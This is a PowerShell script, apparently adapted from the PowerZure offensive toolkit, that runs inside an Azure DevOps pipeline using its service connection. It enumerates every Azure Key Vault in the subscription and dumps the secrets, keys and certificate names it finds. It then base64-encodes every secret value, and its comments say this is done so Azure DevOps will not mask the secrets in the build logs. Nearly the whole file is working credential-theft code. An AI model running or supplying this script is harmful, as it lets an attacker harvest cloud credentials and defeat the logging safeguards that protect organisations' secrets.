#Somewhat stolen from PowerZure Get-AzureKeyVaultContent and Show-AzureKeyVaultContent , thanks hausec!
#reimplemented by Flangvik to run in a single "Azure PowerShell" Agent job, inside an DevOps Pipeline 

#Suppress warnings for clean output
Set-Item Env:\SuppressAzurePowerShellBreakingChangeWarnings "true"

#Get all Azure KeyVaults from currently selected/scoped subscription
#This connection is known as an "Service connection",and in terms of accessing Azure resources, uses either Service principal or Managed identity
$vaults = Get-AzKeyVault

#Dump info about each vault
Write-Host "[+] Located $($vaults.Count) Azure KeyVault(s), dumping info"
ForEach($vault in $vaults)
{

$vaultsname = $vault.VaultName
$Secrets = $Vault | Get-AzKeyVaultSecret
$Keys = $Vault | Get-AzKeyVaultKey
$Certificates = $Vault | Get-AzKeyVaultCertificate
$obj = New-Object -TypeName psobject
$obj | Add-Member -MemberType NoteProperty -Name VaultName -Value $vaultsname
$obj | Add-Member -MemberType NoteProperty -Name SecretName -Value $Secrets.Name
$obj | Add-Member -MemberType NoteProperty -Name SecretContentType -Value $Secrets.ContentType
$obj | Add-Member -MemberType NoteProperty -Name CertificateName -Value $Certificates.Name
$obj | Add-Member -MemberType NoteProperty -Name KeyName -Value $Keys.Name
$obj | Add-Member -MemberType NoteProperty -Name KeyEnabled -Value $Keys.Enabled
$obj | Add-Member -MemberType NoteProperty -Name KeyRecoveryLevel -Value $Keys.RecoveryLevel
$obj | convertto-json -depth 100
}

#Dump base64 encoded secrets from each vault
#Encoding is needed as Azure DevOps will blank out any keys/secrets identified in logs with ******
Write-Host "[+] Dumping Secrets from all KeyVaults found!"

ForEach($vault in $vaults)
{
$Secrets = $vault | Get-AzKeyVaultSecret
ForEach($Secret in $Secrets)
{
$Value = $vault | Get-AzKeyVaultSecret -name $Secret.name
$obj = New-Object -TypeName psobject
$obj | Add-Member -MemberType NoteProperty -Name SecretName -Value $Secret.Name
$obj | Add-Member -MemberType NoteProperty -Name SecretValue -Value $([System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes( $Value.SecretValueText)))
$obj | Add-Member -MemberType NoteProperty -Name ContentType -Value $Value.ContentType
$obj | convertto-json -depth 100
}
}